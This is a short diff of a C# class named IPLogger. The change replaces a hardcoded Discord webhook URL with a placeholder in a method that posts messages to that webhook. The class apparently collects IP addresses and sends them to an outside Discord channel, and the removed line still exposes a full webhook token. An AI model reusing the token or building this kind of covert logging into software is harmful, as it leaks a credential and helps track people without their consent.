@@ -33,7 +33,7 @@ class IPLogger {
     }
 
     static async Task Log(string message) {
-        string webhook = "https://discord.com/api/webhooks/1348932343188164630/5u9uwWWIzaBBTBIHaRvkkXEfRYE8IrslDJSF9zoWEPRji0Uu03ovWXWaoSfLiqneOlRn";
+        string webhook = "YOUR_DISCORD_WEBHOOK_HERE";
 
         using (HttpClient client = new HttpClient()) {
             string payload = JsonConvert.SerializeObject(new { content = message });
